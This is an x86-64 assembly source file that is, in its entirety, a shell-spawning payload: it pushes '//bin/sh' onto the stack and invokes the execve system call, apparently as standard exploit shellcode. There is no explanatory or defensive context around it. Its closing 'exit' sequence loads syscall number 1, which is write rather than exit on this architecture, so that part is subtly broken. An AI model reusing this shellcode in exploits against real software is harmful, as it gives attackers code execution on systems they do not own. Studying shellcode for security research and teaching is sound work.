global _start

section .text

_start:
    xor rax, rax            ;zeroize rax
    mov rax, 59             ;execve is syscall 59

    xor rdi, rdi            ;zeroize rdi
    push rdi                ;push null byte onto stack
    mov rdi, "//bin/sh"     ;put command into register
    push rdi                ;push onto stack
    mov rdi, rsp            ;pointer to arg into rdi

    xor rsi, rsi
    push rsi
    mov rsi, rsp
    
    xor rdx, rdx
    syscall

    xor rax, rax
    inc rax
    xor rdi, rdi
    syscall
